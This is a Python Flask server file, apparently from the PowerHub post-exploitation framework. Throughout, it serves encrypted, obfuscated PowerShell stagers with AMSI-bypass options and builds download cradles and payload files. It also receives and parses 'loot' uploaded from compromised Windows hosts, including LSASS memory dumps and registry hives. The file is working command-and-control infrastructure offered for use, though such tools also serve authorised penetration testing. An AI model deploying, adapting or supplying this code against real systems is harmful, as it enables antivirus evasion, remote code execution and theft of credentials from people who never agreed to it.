
from base64 import b64encode
from binascii import unhexlify
from datetime import datetime
import logging
import os
import shutil
from tempfile import TemporaryDirectory

from flask import Flask, render_template, request, Response, redirect, \
         send_from_directory, flash, abort, jsonify, make_response

from werkzeug.exceptions import BadRequestKeyError
from werkzeug.serving import WSGIRequestHandler, _log
from werkzeug.middleware.proxy_fix import ProxyFix
from flask_socketio import SocketIO  # , emit

from powerhub.sql import get_clipboard, init_db, decrypt_hive, get_loot, \
        delete_loot, get_clip_entry_list
from powerhub.stager import modules, build_cradle, callback_urls, \
        import_modules, webdav_url
from powerhub.upload import save_file, get_filelist
from powerhub.directories import UPLOAD_DIR, DB_FILENAME, \
        XDG_DATA_HOME, STATIC_DIR
from powerhub.payloads import create_payload
from powerhub.tools import encrypt, compress, KEY
from powerhub.auth import requires_auth
from powerhub.repos import repositories, install_repo
from powerhub.obfuscation import symbol_name
from powerhub.loot import save_loot, get_lsass_goodies, get_hive_goodies, \
        parse_sysinfo
from powerhub.args import args
from powerhub.logging import log
from powerhub._version import __version__


app = Flask(__name__)
app.wsgi_app = ProxyFix(app.wsgi_app, x_proto=1, x_host=1, x_port=1)
app.config.update(
    DEBUG=args.DEBUG,
    SECRET_KEY=os.urandom(16),
    SQLALCHEMY_DATABASE_URI='sqlite:///' + DB_FILENAME,
    SQLALCHEMY_TRACK_MODIFICATIONS=False,
)

try:
    from flask_sqlalchemy import SQLAlchemy
    db = SQLAlchemy(app)
    init_db(db)
except ImportError as e:
    log.error("You have unmet dependencies, database will not be available")
    log.exception(e)
    db = None
cb = get_clipboard()

socketio = SocketIO(
    app,
    async_mode="threading",
    cors_allowed_origins=[
        "http://%s:%d" % (
            args.URI_HOST,
            args.LPORT,
        ),
        "https://%s:%d" % (
            args.URI_HOST,
            args.SSL_PORT,
        ),
    ],
)

if not args.DEBUG:
    logging.getLogger("socketio").setLevel(logging.WARN)
    logging.getLogger("engineio").setLevel(logging.WARN)


def push_notification(type, msg, title, subtitle="", **kwargs):
    arguments = {
        'msg': msg,
        'title': title,
        'subtitle': subtitle,
        'type': type,
    }
    arguments.update(dict(**kwargs)),
    socketio.emit('push',
                  arguments,
                  namespace="/push-notifications")


class MyRequestHandler(WSGIRequestHandler):
    def address_string(self):
        if 'x-forwarded-for' in dict(self.headers._headers):
            return dict(self.headers._headers)['x-forwarded-for']
        else:
            return self.client_address[0]

    def log(self, type, message, *largs):
        # don't log datetime again
        if " /socket.io/?" not in largs[0] or args.DEBUG:
            _log(type, '%s %s\n' % (self.address_string(), message % largs))


def run_flask_app():
    socketio.run(
        app,
        port=args.FLASK_PORT,
        host='127.0.0.1',
        use_reloader=False,
        request_handler=MyRequestHandler,
    )


@app.template_filter()
def debug(msg):
    """This is a function for debugging statements in jinja2 templates"""
    if args.DEBUG:
        return msg
    return ""


@app.template_filter()
def nodebug(msg):
    """This is a function for (no) debugging statements in jinja2 templates"""
    if not args.DEBUG:
        return msg
    return ""


@app.template_filter()
def rc4encrypt(msg):
    """This is a function for encrypting strings in jinja2 templates"""
    return b64encode(encrypt(msg.encode(), KEY)).decode()


@app.template_filter()
def rc4byteencrypt(data):
    """This is a function for encrypting bytes in jinja2 templates

    data must be hexascii encoded.
    """
    return b64encode(encrypt(b64encode(unhexlify(data)), KEY)).decode()


@app.route('/')
@requires_auth
def index():
    return redirect('/hub')


@app.route('/hub')
@requires_auth
def hub():
    clip_entries = get_clip_entry_list(cb)
    context = {
        "modules": modules,
        "clip_entries": clip_entries,
        "repositories": list(repositories.keys()),
        "SSL": args.SSL_KEY is not None,
        "AUTH": args.AUTH,
        "VERSION": __version__,
    }
    return render_template("hub.html", **context)


@app.route('/loot')
@requires_auth
def loot_tab():
    # turn sqlalchemy object 'lootbox' into dict/array
    lootbox = get_loot()
    loot = [{
        "nonpersistent": db is None,
        "id": lb.id,
        "lsass": get_lsass_goodies(lb.lsass),
        "lsass_full": lb.lsass,
        "hive": get_hive_goodies(lb.hive),
        "hive_full": lb.hive,
        "sysinfo": parse_sysinfo(lb.sysinfo,)
    } for lb in lootbox]
    context = {
        "loot": loot,
        "AUTH": args.AUTH,
        "VERSION": __version__,
    }
    return render_template("loot.html", **context)


@app.route('/clipboard')
@requires_auth
def clipboard():
    context = {
        "nonpersistent": db is None,
        "clipboard": list(cb.entries.values()),
        "AUTH": args.AUTH,
        "VERSION": __version__,
    }
    return render_template("clipboard.html", **context)


@app.route('/fileexchange')
@requires_auth
def fileexchange():
    context = {
        "files": get_filelist(),
        "AUTH": args.AUTH,
        "VERSION": __version__,
    }
    return render_template("fileexchange.html", **context)


@app.route('/css/<path:path>')
def send_css(path):
    return send_from_directory('static/css', path)


@app.route('/js/<path:path>')
def send_js(path):
    return send_from_directory('static/js', path)


@app.route('/img/<path:path>')
def send_img(path):
    return send_from_directory('static/img', path)


@app.route('/clipboard/add', methods=["POST"])
@requires_auth
def add_clipboard():
    """Add a clipboard entry"""
    content = request.form.get("content")
    cb.add(
        content,
        str(datetime.utcnow()).split('.')[0],
        request.remote_addr
    )
    push_notification("reload", "Update Clipboard", "")
    return redirect('/clipboard')


@app.route('/clipboard/delete', methods=["POST"])
@requires_auth
def del_clipboard():
    """Delete a clipboard entry"""
    id = int(request.form.get("id"))
    cb.delete(id)
    return ""


@app.route('/clipboard/edit', methods=["POST"])
@requires_auth
def edit_clipboard():
    """Edit a clipboard entry"""
    id = int(request.form.get("id"))
    content = request.form.get("content")
    cb.edit(id, content)
    return ""


@app.route('/clipboard/del-all', methods=["POST"])
@requires_auth
def del_all_clipboard():
    """Delete all clipboard entries"""
    for id in list(cb.entries.keys()):
        cb.delete(id)
    return redirect("/clipboard")


@app.route('/clipboard/export', methods=["GET"])
@requires_auth
def export_clipboard():
    """Export all clipboard entries"""
    result = ""
    for e in list(cb.entries.values()):
        headline = "%s (%s)\r\n" % (e.time, e.IP)
        result += headline
        result += "="*(len(headline)-2) + "\r\n"
        result += e.content + "\r\n"*2
    return Response(
        result,
        content_type='text/plain; charset=utf-8'
    )


@app.route('/loot/export', methods=["GET"])
@requires_auth
def export_loot():
    """Export all loot entries"""
    lootbox = get_loot()
    loot = [{
        "id": lb.id,
        "lsass": get_lsass_goodies(lb.lsass),
        "hive": get_hive_goodies(lb.hive),
        "sysinfo": parse_sysinfo(lb.sysinfo,)
    } for lb in lootbox]
    return jsonify(loot)


@app.route('/loot/del-all', methods=["POST"])
@requires_auth
def del_all_loog():
    """Delete all loot entries"""
    # TODO get confirmation by user
    delete_loot()
    return redirect("/loot")


@app.route('/m')
def payload_m():
    """Load a single module"""
    if 'm' not in request.args:
        return Response('error')
    n = int(request.args.get('m'))
    if n < len(modules):
        modules[n].activate()
        if 'c' in request.args:
            resp = b64encode(encrypt(compress(modules[n].code), KEY)),
        else:
            resp = b64encode(encrypt(modules[n].code, KEY)),
        return Response(
            resp,
            content_type='text/plain; charset=utf-8'
        )
    else:
        return Response("not found")


@app.route('/0')
def payload_0():
    """Load 0th stage"""

    try:
        clipboard_id = int(request.args.get('c'))
        exec_clipboard_entry = cb.entries[clipboard_id].content
    except TypeError:
        exec_clipboard_entry = ""
    amsi_bypass = request.args['a']
    amsi_template = ""
    # prevent path traversal
    if not (amsi_bypass == 'none'
            or '.' in amsi_bypass
            or '/' in amsi_bypass
            or '\\' in amsi_bypass):
        amsi_template = "powershell/amsi/"+amsi_bypass+".ps1"
    context = {
        "modules": modules,
        "callback_url": callback_urls[request.args['t']],
        "transport": request.args['t'],
        "key": KEY,
        "amsibypass": amsi_template,
        "symbol_name": symbol_name,
        "stage2": request.args["f"],
        "exec_clipboard_entry": exec_clipboard_entry,
    }
    result = render_template(
                    "powershell/stager.ps1",
                    **context,
                    content_type='text/plain'
    )
    return result


@app.route('/h')
def payload_h():
    """Load next stage of the Hub"""
    try:
        with open(os.path.join(XDG_DATA_HOME, "profile.ps1"), "r") as f:
            profile = f.read()
    except Exception:
        profile = ""
    context = {
        "modules": modules,
        "webdav_url": webdav_url,
        "symbol_name": symbol_name,
        "profile": profile,
        "transport": request.args['t'],
    }
    result = render_template(
                    "powershell/powerhub.ps1",
                    **context,
    ).encode()
    result = b64encode(encrypt(result, KEY))
    return Response(result, content_type='text/plain; charset=utf-8')


@app.route('/ml')
def hub_modules():
    """Return list of hub modules"""
    global modules
    modules = import_modules()
    context = {
        "modules": modules,
    }
    result = render_template(
                    "powershell/modules.ps1",
                    **context,
    ).encode()
    result = b64encode(encrypt((result), KEY))
    return Response(result, content_type='text/plain; charset=utf-8')


@app.route('/dlcradle')
def dlcradle():
    try:
        return build_cradle(request.args, flavor=request.args["flavor"])
    except BadRequestKeyError as e:
        log.error("Unknown key, must be one of %s" % str(request.args))
        return (str(e), 500)


@app.route('/u', methods=["POST"])
def upload():
    """Upload one or more files"""
    file_list = request.files.getlist("file[]")
    is_from_script = "script" in request.args
    loot = "loot" in request.args and request.args["loot"]
    for file in file_list:
        if file.filename == '':
            return redirect(request.url)
        if file:
            if loot:
                loot_id = request.args["loot"]
                log.info("Loot received - %s" % loot_id)
                save_loot(file, loot_id, encrypted=is_from_script)
            else:
                log.info("File received - %s" % file.filename)
                save_file(file, encrypted=is_from_script)
    if loot:
        decrypt_hive(loot_id)
        push_notification("reload", "Update Loot", "")
    else:
        push_notification("reload", "Update Fileexchange", "")
    if is_from_script:
        return ('OK', 200)
    else:
        return redirect('/fileexchange')


@app.route('/d/<path:filename>')
@requires_auth
def download_file(filename):
    """Download a file"""
    try:
        return send_from_directory(
            UPLOAD_DIR,
            filename,
            as_attachment='dl' in request.args,
        )
    except PermissionError:
        abort(403)


@app.route('/d-all')
@requires_auth
def download_all():
    """Download archive of all uploaded files"""
    tmp_dir = TemporaryDirectory()
    file_name = "powerhub_upload_export_" + \
                datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    shutil.make_archive(os.path.join(tmp_dir.name, file_name),
                        "zip",
                        UPLOAD_DIR)
    return send_from_directory(tmp_dir.name,
                               file_name + ".zip",
                               as_attachment=True)


@app.route('/getrepo', methods=["POST"])
@requires_auth
def get_repo():
    """Download a specified repository"""
    msg, msg_type = install_repo(
        request.form['repo'],
        request.form['custom-repo']
    )
    # possible types: success, info, danger, warning
    flash(msg, msg_type)
    return redirect('/hub')


@app.route('/reload', methods=["POST"])
@requires_auth
def reload_modules():
    """Reload all modules from disk"""
    try:
        global modules
        modules = import_modules()
        flash("Modules reloaded (press F5 to see them)", "success")
    except Exception as e:
        flash("Error while reloading modules: %s" % str(e), "danger")
    return render_template("messages.html")


@socketio.on('connect', namespace="/push-notifications")
def test_connect():
    log.debug("Websockt client connected")


@app.route('/static/<filename>')
def server_static(filename):
    try:
        return send_from_directory(STATIC_DIR,
                                   filename,
                                   as_attachment=False)
    except PermissionError:
        abort(403)


@app.route('/dl')
@requires_auth
def download_cradle():
    """Download payload as a file cradle"""
    filename, binary = create_payload(request.args)
    response = make_response(binary)
    response.headers.set('Content-Type', 'application/octet-stream')
    response.headers.set(
        'Content-Disposition',
        'attachment',
        filename=filename,
    )
    return response
